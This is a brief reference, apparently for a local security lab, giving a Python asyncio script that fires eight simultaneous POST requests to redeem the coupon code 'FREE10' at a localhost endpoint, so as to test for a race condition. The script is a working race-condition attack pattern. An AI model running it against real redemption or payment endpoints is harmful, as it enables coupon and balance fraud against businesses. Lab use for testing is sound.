Concurrency Test Reference

To test race condition vulnerabilities, execute simultaneous asynchronous HTTP requests: 

import asyncio
import httpx

async def execute():
    url = "http://127.0.0.1:8000/labs/race/redeem"
    async with httpx.AsyncClient() as client:
        tasks = [client.post(url, data={"code": "FREE10"}) for _ in range(8)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code)

asyncio.run(execute())
Target Endpoint: POST /labs/race/redeem
